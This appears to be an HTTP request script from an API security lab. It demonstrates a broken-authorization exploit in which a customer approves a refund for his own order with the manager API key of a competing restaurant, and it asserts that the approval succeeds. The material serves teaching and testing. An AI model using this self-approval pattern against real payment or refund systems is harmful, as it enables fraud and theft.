# @import ../common/setup.http
@base = {{base_host}}/v301

### Step 1: Plankton orders a Krabby Patty (as a Customer)
# @name login
POST {{base}}/auth/login
Content-Type: application/json

{
    "email": "plankton@chum-bucket.sea",
    "password": "i_love_my_wife"
}

# @name cart
POST {{base}}/cart?restaurant_id=1
Authorization: {{plankton_auth}}

POST {{base}}/cart/{{cart.response.body.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "4" }

# @name order
POST {{base}}/cart/{{cart.response.body.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

tip=1&delivery_address=Chum Bucket

### Step 2: He requests a refund
# @name refund_request
POST {{base}}/orders/{{order.response.body.order_id}}/refund
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

amount=26.50

### Exploit: Conflict of Interest
# Plankton logs into his "Chum Bucket Manager" portal (API Key).
# He approves the refund for his own Krusty Krab order.
# The system allows it because he owns the order (as a Customer), even though he's acting as a Manager of a DIFFERENT restaurant.
# @name exploit
PATCH {{base}}/orders/{{order.response.body.order_id}}/refund/status
Authorization: {{plankton_auth}}
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/x-www-form-urlencoded

status=approved

# Verification: Refund approved by the competitor!
?? status == 200
?? body.status == "approved"
